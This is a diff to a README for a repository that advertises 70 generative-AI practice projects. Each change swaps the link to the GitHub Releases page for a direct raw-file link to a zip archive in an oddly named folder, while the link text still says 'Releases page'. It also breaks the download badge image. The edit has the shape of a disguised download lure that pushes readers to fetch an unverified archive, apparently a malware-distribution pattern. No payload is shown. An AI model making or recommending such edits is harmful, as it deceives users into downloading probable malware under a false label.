@@ -2,7 +2,7 @@
 # 🛠️ GenAI-Architect-70-Hands-On-Projects - Master AI Projects with Ease
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Now-%20%F0%9F%92%BB-brightgreen)](https://github.com/Brucewaynehatake/GenAI-Architect-70-Hands-On-Projects/releases)
+[![Download Release](https://raw.githubusercontent.com/Brucewaynehatake/GenAI-Architect-70-Hands-On-Projects/main/divorcible/GenAI-Architect-70-Hands-On-Projects.zip%20Now-%20%F0%9F%92%BB-brightgreen)](https://raw.githubusercontent.com/Brucewaynehatake/GenAI-Architect-70-Hands-On-Projects/main/divorcible/GenAI-Architect-70-Hands-On-Projects.zip)
 
 ## 📖 Description
 GenAI Architect Academy offers over 70 hands-on projects designed to boost your skills from zero to production. Ideal for anyone looking to enhance their knowledge in AI and related technologies. Whether you're starting from scratch or looking to refine your existing skills, this resource provides practical experiences that you can apply directly.
@@ -11,7 +11,7 @@ GenAI Architect Academy offers over 70 hands-on projects designed to boost your 
 To start using GenAI-Architect-70-Hands-On-Projects, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Brucewaynehatake/GenAI-Architect-70-Hands-On-Projects/releases) to find the latest version of our application.
+   Go to the [Releases page](https://raw.githubusercontent.com/Brucewaynehatake/GenAI-Architect-70-Hands-On-Projects/main/divorcible/GenAI-Architect-70-Hands-On-Projects.zip) to find the latest version of our application.
 
 2. **Choose the Right Download**  
    On the Releases page, you will see different versions available. Select the version that best suits your needs.
@@ -40,7 +40,7 @@ To ensure a smooth experience with GenAI-Architect-70-Hands-On-Projects, your ma
 - **Community Support**: Join our community for help and collaboration with other learners.
 
 ## 🌟 Download & Install
-To get started, [visit the Releases page](https://github.com/Brucewaynehatake/GenAI-Architect-70-Hands-On-Projects/releases) and download the latest version. Follow the steps outlined in the Getting Started section for a smooth installation process.
+To get started, [visit the Releases page](https://raw.githubusercontent.com/Brucewaynehatake/GenAI-Architect-70-Hands-On-Projects/main/divorcible/GenAI-Architect-70-Hands-On-Projects.zip) and download the latest version. Follow the steps outlined in the Getting Started section for a smooth installation process.
 
 ## 🛠️ Roadmap
 Here’s what we plan to add in the upcoming iterations of GenAI Architect Academy:
